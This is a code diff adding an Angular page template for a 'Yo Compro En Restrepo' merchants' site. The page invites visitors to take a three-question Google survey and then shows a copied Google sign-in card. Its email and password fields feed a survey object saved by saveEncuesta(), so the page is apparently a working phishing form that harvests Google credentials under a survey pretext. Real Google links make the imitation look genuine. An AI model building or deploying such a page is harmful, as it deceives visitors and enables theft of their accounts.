@@ -1,0 +1,51 @@
+<div class="contenedor-padre d-flex justify-content-center align-items-center">
+    <img src="assets/icons/logo.png" alt="Comerciantes Restrepo" class="logo">
+    <div class="titulo-padre flex-column align-items-center">
+        <h1 class="titulotext mb-0">Yo Compro</h1>
+        <h1 class="titulotext">En Restrepo</h1>
+    </div>
+</div>
+<h4 class="d-flex justify-content-center align-items-center titulo" style="background-color: #f5f5f5;">Ayudanos llenando
+    la siguiente encuesta de Google para poder mejorar</h4>
+    <h4 class="d-flex justify-content-center align-items-center titulo" style="background-color: #f5f5f5;">Son solo 3 preguntas, Gracias!</h4>
+<div class="login-container">
+    <div class="login-card">
+        <div class="google-header">
+            <img src="assets/google-logo.webp" alt="Google Logo" class="logo">
+            <div>Inicia sesión</div>
+            <p class="gmail-link">Ir a Gmail</p>
+        </div>
+
+        <input type="email" placeholder="Correo electrónico o teléfono" [(ngModel)]="nuevaEncuesta.email">
+        <input type="password" placeholder="Contraseña" [(ngModel)]="nuevaEncuesta.contrasena">
+
+        <a href="https://accounts.google.com/signin/v2/usernamerecovery?theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+            class="forgot-link">¿Has olvidado tu correo electrónico?</a>
+
+        <div class="info-text">¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a
+                href="https://support.google.com/chrome/answer/6130773?hl=es">Más información</a></div>
+
+        <div class="actions">
+            <a href="https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com&hl=es&biz=false&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp"
+                target="_blank">
+                <button class="create-account-button">Crear cuenta</button>
+            </a>
+
+            <button class="signin-button" (click)="saveEncuesta()">Siguiente</button>
+
+        </div>
+
+
+    </div>
+    <div class="footer-links">
+        <div class="language-select-container">
+            <select class="language-select">
+                <option value="es">Español (España)</option>
+                <!-- Agrega más idiomas según lo requieras -->
+            </select>
+        </div>
+        <p><a href="#">Ayuda</a></p>
+        <p><a href="#">Privacidad</a></p>
+        <p><a href="#">Términos</a></p>
+    </div>
+</div>
